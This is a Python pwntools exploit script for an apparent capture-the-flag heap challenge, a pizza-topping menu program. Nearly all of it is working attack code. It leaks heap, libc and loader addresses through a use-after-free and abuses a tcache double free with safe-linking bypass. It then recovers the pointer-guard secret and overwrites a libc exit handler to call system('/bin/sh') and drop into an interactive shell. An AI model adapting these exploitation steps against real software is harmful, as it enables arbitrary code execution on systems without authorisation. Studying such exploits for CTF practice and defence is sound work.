#!/usr/bin/env python3
from pwn import *
import pwnlib.tubes.process as pt

#challenge info
address = ""
port = 1337

context.terminal = ['tmux','new-window']
# context.log_level = 'debug'

# debugging
# breakpoint after each malloc happens
gdb_args= """
# brva 0x14DD
brva 0x1849
c
"""

e = ELF("./pizzeria_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = e


def conn():
    if args.REMOTE:
        r = remote(address,port)
    elif args.GDB:
        r = gdb.debug([e.path],gdb_args)
    else:
        r = process([e.path])

    return r

def add_topping(r:pt.process,topping:str,quantity:int):
    r.recvuntil(b"Enter your choice : ")
    r.sendline(b"1")
    r.recvuntil(b"Which topping ?")
    r.sendline(topping.encode())
    r.sendline(str(quantity).encode())
    r.recvuntil(b"Ok, adding ")
    r.recvline()
    return

def verify_topping(r:pt.process,topping:str):
    r.recvuntil(b"Enter your choice : ")
    r.sendline(b"4")
    r.recvuntil(b"Which topping to verify ?")
    r.sendline(topping.encode())
    return

def bake(r:pt.process):
    r.recvuntil(b"Enter your choice : ")
    r.sendline(b"5")
    r.recvuntil(b"Here it is : ")
    return 

def customize_topping(r:pt.process,topping:str,new_topping:bytes):
    r.recvuntil(b"Enter your choice : ")
    r.sendline(b"2")
    r.recvuntil(b"Which one to customize ?")
    r.sendline(topping.encode())
    r.recvuntil(b"Enter new modified topping :")
    r.send(new_topping)
    r.recvuntil(b"New topping added successfully !")
    return

def remove_topping(r:pt.process,topping:str):
    r.recvuntil(b"Enter your choice : ")
    r.sendline(b"3")
    r.recvuntil(b"Which topping to remove ?")
    r.sendline(topping.encode())
    return

def deobfuscate(pos,ptr):
    return (pos >> 12) ^ ptr

def rotate_left(val, r_bits, max_bits):
    return ((val << r_bits) & (2**max_bits - 1)) | (val >> (max_bits - r_bits))

def rotate_right(val, r_bits, max_bits):
    return (val >> r_bits) | ((val << (max_bits - r_bits)) & (2**max_bits - 1))

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

# Rotate right: 0b1001 --> 0b1100
ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

# encrypt a function pointer
def encrypt(v, key):
    return p64(rol(v ^ key, 0x11, 64))

def main():
    r = conn()
    # good luck pwning :)


    # leak libc
    # add 8 toppings
    add_topping(r,"Tomato",63)
    add_topping(r,"Onion",63)
    add_topping(r,"Capsicum",63)
    add_topping(r,"Corn",63)
    add_topping(r,"Mushroom",63)
    add_topping(r,"Olives",63)
    add_topping(r,"Paneer",63)
    add_topping(r,"Double Cheese",63)



    # remove 8 toppings
    remove_topping(r,"Double Cheese")

    # leak heap
    verify_topping(r,"Double Cheese")
    junk = r.recvline()
    # log.warn(junk)
    leak = r.recv(5)
    leak = u64(leak.ljust(8,b"\x00"))
    log.warn(f"Leak: {hex(leak)}")
    leak = leak << 12
    heap = leak - 0x1000
    log.warn(f"Heap base: {hex(heap)}")

    remove_topping(r,"Paneer")
    remove_topping(r,"Olives")
    remove_topping(r,"Mushroom")
    remove_topping(r,"Corn")
    remove_topping(r,"Capsicum")
    remove_topping(r,"Onion")
    remove_topping(r,"Tomato")
    # chunks endup in unsorted bin

    verify_topping(r,"Tomato")
    junk = r.recvline()
    # log.warn(junk)
    leak = r.recv(6)
    leak = u64(leak.ljust(8,b"\x00"))
    libc.address= leak - libc.sym["main_arena"] - 96
    log.warn(f"Libc base: {hex(libc.address)}")


    # provide double free

    # add 8 toppings
    add_topping(r,"Tomato",8)
    add_topping(r,"Onion",8)
    add_topping(r,"Capsicum",8)
    add_topping(r,"Corn",8)
    add_topping(r,"Mushroom",8)
    add_topping(r,"Olives",8)
    add_topping(r,"Paneer",8)
    add_topping(r,"Double Cheese",8)

    # guard chunk
    add_topping(r,"Chicken",8)

    remove_topping(r,"Double Cheese")
    remove_topping(r,"Paneer")
    remove_topping(r,"Olives")
    remove_topping(r,"Mushroom")
    remove_topping(r,"Corn")
    remove_topping(r,"Capsicum")
    remove_topping(r,"Onion")
    remove_topping(r,"Tomato")

    # Olives-> panner -> doublechees
    

    # pop one from tcache
    add_topping(r,"Paneer",8)

    # double free
    remove_topping(r,"Tomato")

    add_topping(r,"Tomato",8)


    pointer_position = heap + 0x290
    mangled = deobfuscate(pointer_position,0)
    customize_topping(r,"Tomato",p64(mangled))
    # log.warn(f"mangled initial: {hex(mangled)}")
    log.warn(f"initial: {hex(libc.sym["initial"])}")


    # log.warn(f"pointer position: {hex(pointer_position)}")

    # add 6 toppings 
    add_topping(r,"Onion",8)
    add_topping(r,"Capsicum",8)
    add_topping(r,"Corn",8)
    add_topping(r,"Mushroom",8)
    add_topping(r,"Olives",8)
    add_topping(r,"Paneer",8)


    add_topping(r,"Double Cheese",8)

    # free in tcache
    remove_topping(r,"Chicken")
    remove_topping(r,"Double Cheese")

    mangled = deobfuscate(pointer_position,libc.address+0x219160)
    customize_topping(r,"Tomato",p64(mangled))

    add_topping(r,"Double Cheese",8)
    add_topping(r,"Pineapple",8)

    log.warn(f"dl_sht: {hex(libc.address+0x219160)}")


    customize_topping(r,"Pineapple",b"aaaaaaaaaaaaaaaaaaaaaaaa")

    verify_topping(r,"Pineapple")
    junk = r.recvuntil(b"aaaaaaaaaaaaaaaaaaaaaaaa")
    leak = r.recv(6)

    leak = u64(leak.ljust(8,b"\x00"))
    log.warn(f"_tunable_get_val {hex(leak)}")

    ld.address = leak - ld.sym["__tunable_get_val"]
    log.warn(f"ld base: {hex(ld.address)}")

    add_topping(r,"Pineapple",63)
    add_topping(r,"Double Cheese",63)
    add_topping(r,"Tomato",63)



    dl_fini = ld.address + 0x2000 + 0x4040
    log.warn(f"dl_fini: {hex(dl_fini)}")

    # double free once again

    # add 8 toppings
    add_topping(r,"Tomato",8)
    add_topping(r,"Onion",8)
    add_topping(r,"Capsicum",8)
    add_topping(r,"Corn",8)
    add_topping(r,"Mushroom",8)
    add_topping(r,"Olives",8)
    add_topping(r,"Paneer",8)
    add_topping(r,"Double Cheese",8)

    # guard chunk
    add_topping(r,"Chicken",8)

    remove_topping(r,"Double Cheese")
    remove_topping(r,"Paneer")
    remove_topping(r,"Olives")
    remove_topping(r,"Mushroom")
    remove_topping(r,"Corn")
    remove_topping(r,"Capsicum")
    remove_topping(r,"Onion")
    remove_topping(r,"Tomato")


    # pop one from tcache
    add_topping(r,"Paneer",8)

    # double free once again
    remove_topping(r,"Tomato")

    add_topping(r,"Tomato",8)


    pointer_position = heap + 0x1380
    mangled = deobfuscate(pointer_position,0)
    customize_topping(r,"Tomato",p64(mangled))



    # add 6 toppings 
    add_topping(r,"Onion",8)
    add_topping(r,"Capsicum",8)
    add_topping(r,"Corn",8)
    add_topping(r,"Mushroom",8)
    add_topping(r,"Olives",8)
    add_topping(r,"Paneer",8)



    add_topping(r,"Double Cheese",8)

    # free in tcache
    remove_topping(r,"Chicken")
    remove_topping(r,"Double Cheese")

    mangled = deobfuscate(pointer_position,libc.sym["initial"])
    customize_topping(r,"Tomato",p64(mangled))

    add_topping(r,"Double Cheese",8)
    add_topping(r,"Pineapple",8)

    customize_topping(r,"Pineapple",b"a"*0x18)


    verify_topping(r,"Pineapple")
    junk = r.recvuntil(b"aaaaaaaaaaaaaaaaaaaaaaaa")
    leak = r.recv(8)

    secret = u64(leak)
    secret = rotate_right(secret,0x11,64) ^ dl_fini
    log.warn(f"Secret: {hex(secret)}")


    one_gadget = 0xebd3f

    encoded_win = rotate_left(secret^libc.sym["system"],0x11,64)
    log.warn(f"Encoded win: {hex(encoded_win)}")
    
    binsh = next(libc.search(b"/bin/sh"))

    customize_topping(r,"Pineapple",p64(0)+p64(1)+p64(4)+p64(encoded_win)+p64(binsh))

    # gdb.attach(r,"""c""")

    add_topping(r,"Pineapple",8)
    add_topping(r,"Double Cheese",8)
    add_topping(r,"Tomato",8)
    bake(r)
    r.interactive()



    


if __name__ == "__main__":
    main()